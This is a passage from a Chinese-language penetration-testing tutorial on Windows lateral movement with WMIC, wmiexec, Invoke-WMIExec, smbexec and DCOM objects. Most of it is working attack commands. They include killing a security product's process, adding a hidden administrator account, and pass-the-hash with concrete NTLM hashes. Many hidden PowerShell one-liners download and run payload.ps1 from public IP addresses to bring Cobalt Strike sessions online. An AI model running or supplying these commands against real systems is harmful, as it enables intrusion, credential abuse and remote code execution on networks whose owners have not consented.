&#x27;%forti%&#x27;&quot;</span> <span class="hljs-built_in">get</span> name<br>wmic process where <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;FortiTray.exe&quot;</span> call terminate<br>wmic /namespace:\\root\securitycenter2 path antivirusproduct <span class="hljs-built_in">GET</span><br>displayName,productState,pathToSignedProductExe<br>wmic /namespace:\\root\securitycenter2 path antispywareproduct <span class="hljs-built_in">GET</span><br>displayName,productState, pathToSignedProductExe &amp; wmic<br>/namespace:\\root\securitycenter2 path antivirusproduct <span class="hljs-built_in">GET</span><br>displayName,productState, pathToSignedProductExe<br>常见错误<br>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct <span class="hljs-built_in">Get</span><br>displayName /Format:List<br>查询windows机器版本和服务位数和.net版本<br>wmic os <span class="hljs-built_in">get</span> caption<br>wmic os <span class="hljs-built_in">get</span> osarchitecture<br>wmic OS <span class="hljs-built_in">get</span> Caption,CSDVersion,OSArchitecture,Version<br>wmic product where <span class="hljs-string">&quot;Name like &#x27;Microsoft .Net%&#x27;&quot;</span> <span class="hljs-built_in">get</span> Name, Version<br>查询本机所有盘符<br>wmic logicaldisk list brief<br>wmic logicaldisk <span class="hljs-built_in">get</span> description,name,size,freespace /value<br>卸载和重新安装程序<br>wmic product where <span class="hljs-string">&quot;name like &#x27;%Office%&#x27;&quot;</span> <span class="hljs-built_in">get</span> name<br>wmic product where <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Office&quot;</span> call uninstall<br>查看某个进程的详细信息 （路径，命令⾏参数等）<br>wmic process where <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;chrome.exe&quot;</span> list full<br>wmic process where <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;frp.exe&quot;</span> <span class="hljs-built_in">get</span> executablepath,name,ProcessId 进程路径<br>wmic process where <span class="hljs-attribute">caption</span>=<span class="hljs-string">&quot;frp.exe&quot;</span> <span class="hljs-built_in">get</span> caption,commandline /value<br>更改PATH环境变量值，新增c:\whoami<br>wmic environment where <span class="hljs-string">&quot;name=&#x27;path&#x27; and username=&#x27;&lt;system&gt;&#x27;&quot;</span> <span class="hljs-built_in">set</span><br><span class="hljs-attribute">VariableValue</span>=<span class="hljs-string">&quot;%path%;c:\whoami</span><br><span class="hljs-string">查看某个进程的详细信息-PID</span><br><span class="hljs-string">wmic process list brief</span><br><span class="hljs-string">tasklist /SVC | findstr frp.exe</span><br><span class="hljs-string">wmic process where ProcessId=3604 get</span><br><span class="hljs-string">ParentProcessId,commandline,processid,executablepath,name,CreationClassName,Crea</span><br><span class="hljs-string">tionDate</span><br><span class="hljs-string">终⽌⼀个进程</span><br><span class="hljs-string">wmic process where name =&quot;</span>xshell.exe&quot; call terminate<br>ntsd -c q -p 进程的PID<br>taskkill -im pid<br>获取电脑产品编号和型号信息<br>wmic baseboard <span class="hljs-built_in">get</span> Product,SerialNumber<br>wmic bios <span class="hljs-built_in">get</span> serialnumber<br>安装软件<br>wmic product <span class="hljs-built_in">get</span> name,version<br>wmic product list brief<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231023171423034.png" alt="image-20231023171423034"></p><h3 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs makefile">1.开启防火墙时，允许共享例外<br><span class="hljs-section">错误:</span><br>代码 = 0x800706ba<br>说明 = RPC 服务器不可用。<br>设备 = Win32<br>2.组策略阻止administraotr远程访问时<br><span class="hljs-section">错误:</span><br>代码 = 0x80070005<br>说明 = 拒绝访问。<br>设备 = Win32<br>3.IP安全策略阻止135时<br><span class="hljs-section">错误:</span><br>代码 = 0x800706ba<br>说明 = RPC 服务器不可用。<br>设备 = Win32<br>4.禁用winmgmt服务时<br><span class="hljs-section">错误:</span><br>wmic调用cmd<br>以下命令需要管理员权限<br>利用powershell上线<br>1、使用cs生成powershell脚本<br>2、wmic进行上线,把ps1放大公网，可以使用python 开启http服务提供下载 python-m http.server<br>9988<br>3、等待片刻上线<br>代码 = 0x80070422<br>说明 = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。<br>设备 = Win32<br>5.拒绝wbem目录权限，无法使用wmic的<br></code></pre></td></tr></table></figure><h3 id="wmic调用cmd"><a href="#wmic调用cmd" class="headerlink" title="wmic调用cmd"></a>wmic调用cmd</h3><p>以下命令需要管理员权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行命令并且输出<br>wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create<br><span class="hljs-string">&quot;cmd.exe /c ipconfig &gt;c:\ip.txt&quot;</span><br>列出远程主机进程<br>wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process list brief<br>在远程系统上执行bat脚本<br>wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create<br>c:\programdata\test.bat<br>wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create<br><span class="hljs-string">&quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1</span><br><span class="hljs-string">/add</span><br><span class="hljs-string">执行powershell上线</span><br><span class="hljs-string">wmic /NODE:IP /user:本地用户管理员/域管理员 /password:密码 PROCESS call create</span><br><span class="hljs-string">&quot;</span>powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;ps脚本地址&#x27;))\&quot;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231023172045232.png" alt="image-20231023172045232"></p><p><img src="/img/image-20231023172030175.png" alt="image-20231023172030175"></p><h3 id="利用powershell上线"><a href="#利用powershell上线" class="headerlink" title="利用powershell上线"></a>利用powershell上线</h3><p>1、使用cs生成powershell脚本</p><p><img src="/img/image-20231023172619087.png" alt="image-20231023172619087"> </p><p>2、wmic进行上线,把ps1放到公网，可以使用python 开启http服务提供下载 python -m http.server 8989</p><p><img src="/img/image-20231023173616913.png" alt="image-20231023173616913"> </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /NODE:<span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.11</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:Admin123 PROCESS <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;ps脚本地址&#x27;</span>))\&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231023175455418.png" alt="image-20231023175455418"></p><p>3、等待片刻上线</p><p><img src="/img/image-20231023174552693.png" alt="image-20231023174552693"></p><h3 id="Wmiexec工具"><a href="#Wmiexec工具" class="headerlink" title="Wmiexec工具"></a>Wmiexec工具</h3><p>wmiexec是一个即有全交互也有半交互的远程命令执行工具，有python版本的pe版本可运用于多种环境，包括webshell环境、rdp环境、socks环境等</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">wmiexec.exe 域名/用户名:密码<span class="hljs-meta">@目标IP</span> <span class="hljs-comment">#哈希传递获得shell</span><br>wmiexec.exe administrator:Admin123<span class="hljs-meta">@10.210.100.11</span> <span class="hljs-string">&quot;whoami&quot;</span><br>wmiexec.exe 域名/用户名:密码<span class="hljs-meta">@目标IP</span> <span class="hljs-string">&quot;ipconfig&quot;</span> <span class="hljs-comment">#执行命令</span><br>wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名<span class="hljs-meta">@目标IP</span> <span class="hljs-comment">#哈希传递获得shell</span><br>wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名<span class="hljs-meta">@目标IP</span> <span class="hljs-string">&quot;ipconfig&quot;</span> <span class="hljs-comment">#执行命令</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231023175142705.png" alt="image-20231023175142705"> </p><h4 id="利用powershell上线-1"><a href="#利用powershell上线-1" class="headerlink" title="利用powershell上线"></a>利用powershell上线</h4><p>1、使用账号密码登录进行powershell上线</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">wmiexec.<span class="hljs-keyword">exe</span> administrator:Admin123@<span class="hljs-number">10.210</span>.<span class="hljs-number">100.11</span> <span class="hljs-comment">&quot;powershell.exe -nop -w hidden</span><br>-<span class="hljs-keyword">c</span> IEX ((<span class="hljs-keyword">new</span>-object net.webclient).downloadstring(<span class="hljs-string">&#x27;http://ip:8989/payload.ps1&#x27;</span>))<span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231023175425287.png" alt="image-20231023175425287"></p><p>2、使用hash上线</p><p>cs右键dumphash</p><p> <img src="/img/image-20231023175608734.png" alt="image-20231023175608734"></p><p>aad3b435b51404eeaad3b435b51404ee:e45a314c664d40a227f9540121d1a29d</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">wmiexec.exe -hashes<br>aad3b435b51404eeaad3b435b51404ee:e45a314c664d40a227f9540121d1a29d<br>administrator@<span class="hljs-number">10.210</span>.<span class="hljs-number">100.11</span> <span class="hljs-string">&quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br>net.webclient).downloadstring(&#x27;http://ip:<span class="hljs-number">8989</span>/payload.ps1&#x27;))<span class="hljs-string">&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231023175927509.png" alt="image-20231023175927509"></p><p><img src="/img/image-20231023175954251.png" alt="image-20231023175954251"> </p><h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显， 获取远程主机的半交互式Shell。wmiexec.vbs支持两种模式，一种是半交互式shell模式，另一种是执行 单条命令模式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cscript.exe <span class="hljs-regexp">//</span>nologo wmiexec.vbs /cmd IP 用户 密码 <span class="hljs-string">&quot;命令&quot;</span><br></code></pre></td></tr></table></figure><p>使用powershell上线</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cscript.exe <span class="hljs-comment">//nologo wmiexec.vbs /cmd 10.210.100.11 administrator Admin123</span><br><span class="hljs-string">&quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br>net.webclient).downloadstring(&#x27;http://ip:<span class="hljs-number">9988</span>/payload.ps1&#x27;))<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Invoke-WMIExec"><a href="#Invoke-WMIExec" class="headerlink" title="Invoke-WMIExec"></a>Invoke-WMIExec</h3><p>Invoke-WMIExec是一个powershell脚本在Invoke-TheHash的文件中用法如下</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Invoke-WMIExec -Target IP -<span class="hljs-built_in">Domain</span> 域 -Username 用户 -<span class="hljs-built_in">Hash</span> <span class="hljs-built_in">hash</span>-Command <span class="hljs-string">&quot;calc.exe&quot;</span><br>-verbose<br></code></pre></td></tr></table></figure><p>采用无文件落地的方式进行横向</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">shell powershell -exec bypass -c IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span><br><span class="hljs-keyword">System</span>.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://118.178.134.226:9988/Invoke-WMIExec.ps1&#x27;</span>);<span class="hljs-keyword">import</span>-module .\Invoke-WMIExec.ps1;Invoke-WMIExec -Target<br><span class="hljs-number">192.168</span><span class="hljs-number">.41</span><span class="hljs-number">.148</span> -Username administrator -Hash <span class="hljs-number">570</span>a9a65db8fba761c1008a51d4c95ab -<br>Command &quot;whoami&quot; -<span class="hljs-keyword">verbose</span><br></code></pre></td></tr></table></figure><p>本地执行 </p><p>1、导入脚本</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">powershell</span>-<span class="hljs-keyword">import</span> powershell/Invoke-WMIExec.ps1<br></code></pre></td></tr></table></figure><p>2、运行上线命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">powershell Invoke-WMIExec -Target <span class="hljs-number">192.168</span>.<span class="hljs-number">41.20</span> -Username administrator -Hash<br><span class="hljs-number">570</span>a9a65db8fba761c1008a51d4c95ab -Command <span class="hljs-comment">&quot;powershell.exe -nop -w hidden -c IEX</span><br>((<span class="hljs-keyword">new</span>-object<br>net.webclient).downloadstring(<span class="hljs-string">&#x27;http://118.178.134.226:9988/payload.ps1&#x27;</span>))<span class="hljs-comment">&quot; -</span><br><span class="hljs-keyword">verbose</span><br></code></pre></td></tr></table></figure><h3 id="Invoke-WMIMethod-ps1"><a href="#Invoke-WMIMethod-ps1" class="headerlink" title="Invoke-WMIMethod.ps1"></a>Invoke-WMIMethod.ps1</h3><p>该模块为Powershell内置模块，以下为示例(在被控机器的powershell中执行)，可以自由组合命令进行测试。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$User</span> <span class="hljs-comment">#目标系统用户名</span><br><span class="hljs-variable">$Password</span> <span class="hljs-comment">#目标系统密码</span><br><span class="hljs-variable">$Cred</span> <span class="hljs-comment">#账号密码整合，导入Credential</span><br><span class="hljs-built_in">Invoke-WMIMethod</span> <span class="hljs-comment">#远程运行指定程序</span><br><span class="hljs-comment">#####---------------------------#####</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;administrator&quot;</span><br><span class="hljs-variable">$Password</span>= <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;Admin@123&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential -<br>ArgumentList <span class="hljs-variable">$User</span> , <span class="hljs-variable">$Password</span><br><span class="hljs-built_in">Invoke-WMIMethod</span> <span class="hljs-literal">-Class</span> Win32_Process <span class="hljs-literal">-Name</span> Create <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;powershell.exe</span><br><span class="hljs-string">-nop -w hidden -c IEX ((new-object</span><br><span class="hljs-string">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span> -<br>ComputerName <span class="hljs-string">&quot;192.168.41.20&quot;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><h2 id="14-smb远程执行命令横向移动"><a href="#14-smb远程执行命令横向移动" class="headerlink" title="14.smb远程执行命令横向移动"></a>14.smb远程执行命令横向移动</h2><h3 id="SMB介绍"><a href="#SMB介绍" class="headerlink" title="SMB介绍"></a>SMB介绍</h3><p>SMB全称是Server Message Block翻译过来是服务器信息块，<strong>它也是一种客户端到服务器的通信协议</strong>。除此之外，SMB协议也被称为请求-回复协议。客户端与服务器建立连接后,客户端可以向服务器发送SMB命令允许用户访问共享、打开、读取或者是写入文件。</p><p>利用条件：开启了445端口</p><h3 id="smbexec使用"><a href="#smbexec使用" class="headerlink" title="smbexec使用"></a>smbexec使用</h3><p>smbexec为impacket工具中的工具，操作简单，容易被杀，使用时无需先进行IPC连接</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">明文传递命令：<br>smbexec hsyy.com/<span class="hljs-symbol">administrator:</span><span class="hljs-number">123</span>.com<span class="hljs-variable">@192</span>.<span class="hljs-number">168.213</span>.<span class="hljs-number">163</span><br>hash传递：<br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.213</span>.<span class="hljs-number">163</span><br>smbbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.213</span>.<span class="hljs-number">163</span><br></code></pre></td></tr></table></figure><h3 id="使用明文"><a href="#使用明文" class="headerlink" title="使用明文"></a>使用明文</h3><p>存在交互，需要远控电脑</p><p>1、输入命令</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">smbexec.exe administrator:<span class="hljs-symbol">Admin123@</span><span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.11</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024100117801.png" alt="image-20231024100117801"></p><h3 id="使用hash"><a href="#使用hash" class="headerlink" title="使用hash"></a>使用hash</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">smbexec.exe -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:e<span class="hljs-number">45</span>a<span class="hljs-number">314</span><span class="hljs-keyword">c</span><span class="hljs-number">664</span>d<span class="hljs-number">40</span>a<span class="hljs-number">227</span>f<span class="hljs-number">9540121</span>d<span class="hljs-number">1</span>a<span class="hljs-number">29</span>d administrator<span class="hljs-title">@10</span>.<span class="hljs-number">210.100</span>.<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024100348861.png" alt="image-20231024100348861"></p><h2 id="15-DCOM远程执行命令横向移动"><a href="#15-DCOM远程执行命令横向移动" class="headerlink" title="15.DCOM远程执行命令横向移动"></a>15.DCOM远程执行命令横向移动</h2><h3 id="DCOM介绍"><a href="#DCOM介绍" class="headerlink" title="DCOM介绍"></a>DCOM介绍</h3><p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口<strong>。它支持不同的两台机器上的组件间的通信</strong>，不论它们是运行在局域网、广域网、还是Internet上。<strong>利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求</strong>，使用DCOM进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管COM服务器端的软件</p><h3 id="获取DCOM列表"><a href="#获取DCOM列表" class="headerlink" title="获取DCOM列表"></a>获取DCOM列表</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-CimInstance Win32_DCOMApplication<br><span class="hljs-keyword">Get</span>-CimInstance -classWin32_DCOMApplication | <span class="hljs-keyword">select</span> appid,<span class="hljs-type">name</span><br><span class="hljs-keyword">Get</span>-WmiObject -Namespace ROOT\CIMV2 -<span class="hljs-keyword">Class</span> Win32_DCOMApplication<br></code></pre></td></tr></table></figure><h3 id="DCOM横向前提"><a href="#DCOM横向前提" class="headerlink" title="DCOM横向前提"></a>DCOM横向前提</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1、需要关闭系统防火墙<br>2、必须拥有管理员权限<br>3、在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户<br></code></pre></td></tr></table></figure><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="MMC20-Application组件远程执行命令"><a href="#MMC20-Application组件远程执行命令" class="headerlink" title="MMC20.Application组件远程执行命令"></a>MMC20.Application组件远程执行命令</h4><p>1、通过PowerShell与DCOM进行远程交互，此外，我们只需要提供一个DCOM ProgID和一个IP地址， 然后，它就从远程返回一个COM对象的实例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> =<span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br></code></pre></td></tr></table></figure><p>2、然后执行如下命令，我们就可以调用”ExecuteShellCommand”方法在远程主机上启动进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024103430187.png" alt="image-20231024103430187"></p><p>3、将IP和命令换成上线的命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> =<span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.210.100.12&quot;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://49.234.20.184:8989/payload.ps1&#x27;))&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure><p>分开执行可能会失败，连接起来执行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.210.100.12&quot;</span>))<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://49.234.20.184:8989/payload.ps1&#x27;))&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024104740185.png" alt="image-20231024104740185"></p><p><img src="/img/image-20231024104755414.png" alt="image-20231024104755414"> </p><h4 id="ShellWindows组件远程执行命令"><a href="#ShellWindows组件远程执行命令" class="headerlink" title="ShellWindows组件远程执行命令"></a>ShellWindows组件远程执行命令</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[<span class="hljs-title class_">Activator</span>]::<span class="hljs-title class_">CreateInstance</span>([<span class="hljs-title class_">Type</span>]::<span class="hljs-title class_">GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-</span><br><span class="hljs-string">00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;10.210.100.12&quot;</span>)).item().<span class="hljs-title class_">Document</span>.<span class="hljs-title class_">Application</span>.<span class="hljs-title class_">ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">/c calc.exe&quot;</span>,<span class="hljs-string">&quot;c:windowssystem32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>) 打开本地计算器<br></code></pre></td></tr></table></figure><p>远程上线：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[Activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[Type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;10.210.100.12&quot;</span>))<span class="hljs-selector-class">.item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://49.234.20.184:8989/payload.ps1&#x27;))&quot;</span>,<span class="hljs-string">&quot;c:windowssystem32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024105237487.png" alt="image-20231024105237487"></p><p><img src="/img/image-20231024105346183.png" alt="image-20231024105346183"> </p><h3 id="ShellBrowserWindow远程执行命令"><a href="#ShellBrowserWindow远程执行命令" class="headerlink" title="ShellBrowserWindow远程执行命令"></a>ShellBrowserWindow远程执行命令</h3><p>适用于Windows 10和Windows Server 2012 R2等版本的系统。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span>,<span class="hljs-string">&quot;10.210.100.12&quot;</span>))<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://49.234.20.184:8989/payload.ps1&#x27;))&quot;</span>,<span class="hljs-string">&quot;c:windowssystem32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024105725252.png" alt="image-20231024105725252"> </p><h3 id="调用Excel-Application远程执行命令"><a href="#调用Excel-Application远程执行命令" class="headerlink" title="调用Excel.Application远程执行命令"></a>调用Excel.Application远程执行命令</h3><p>目标主机中安装有excel</p><p>1、 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span 